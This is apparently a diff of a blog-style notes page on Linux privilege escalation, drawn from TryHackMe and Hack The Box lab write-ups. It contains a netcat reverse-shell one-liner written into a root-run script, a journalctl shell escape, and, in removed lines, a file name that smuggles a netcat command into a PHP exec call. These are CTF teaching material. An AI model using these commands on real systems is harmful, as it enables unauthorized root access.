@@ -10,7 +10,6 @@ math: true
 
 # SUID binaries for privilege escalation:
 
-
 ## tryhackme linux priv esc arena:
 
 
@@ -240,13 +239,14 @@ We check privelages for the copy.sh file and it turns out that we can write to i
 We add a reverse shell to the file and execute it as root and we get a shell.
 
 ```bash
+
 www-data@THM-Chal:/home/itguy$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc xx.xx.xx.xx 1234 >/tmp/f" > /etc/copy.sh
 < -i 2>&1|nc xx.xx.xx.xx 1234 >/tmp/f" > /etc/copy.sh
 www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl
 sudo /usr/bin/perl /home/itguy/backup.pl
 ```
 And we setup a listener on our box and we get a connection!
-```
+```bash
 kali@kali:~/tryhackme$ nc -nlvp 1234
 listening on [any] 1234 ...
 connect to [10.9.36.51] from (UNKNOWN) [10.10.87.188] 59192
@@ -258,7 +258,6 @@ uid=0(root) gid=0(root) groups=0(root)
 # cat root.txt
 THM{6637f41d0177b6f37cb20d775124699f}
 ```
-## tryhackme linux privlege escalation arena(80 different SUID binaries)(80 different priv esc methods):
 
 # Other
 
@@ -624,7 +623,7 @@ This tells us that we can run `journalctl` as root.
 
 We can do a quick search on gtfobins which tells us that we can use it to execute a shell if our window is minimal.
 ```bash
-avid@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
+david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
 -- Logs begin at Thu 2020-04-09 19:07:20 EDT, end at Sat 2020-04-11 01:14:31 EDT. --
 Apr 10 23:47:54 traverxec sudo[4133]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pts/7 ruser=www-data rhost=  user=w
 Apr 10 23:47:56 traverxec sudo[4133]: pam_unix(sudo:auth): conversation failed
@@ -632,7 +631,7 @@ Apr 10 23:47:56 traverxec sudo[4133]: pam_unix(sudo:auth): auth could not identi
 Apr 10 23:47:56 traverxec sudo[4133]: www-data : command not allowed ; TTY=pts/7 ; PWD=/tmp ; USER=root ; COMMAND=list
 Apr 10 23:47:56 traverxec crontab[4194]: (www-data) LIST (www-data)
 !/bin/bash
-root@traverxec:/home/david#
+root@traverxec:/home/david
 ```
 After the script has executed we type `!/bin/bash` which will give us a shell.
 
@@ -667,17 +666,6 @@ root@debian:/home/user# id && whoami
 uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
 root
 ```
-## Using touch to make an executable file name - hack the box networed:
-
-After gaining a shell we find a file which involves this interesting line:
-```bash
-exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
-```
-we can see that the variable holds the name of a file and if we name it in a specific way we can try and execute code with it.
-```bash
-touch ";nc ourip 1234 -c bash"
-```
-And then if we setup a listener on port 1234 with `nc -nlvp 1234` we get a connection back on our shell.
 
 
 Thanks for reading hope that you enjoyed.
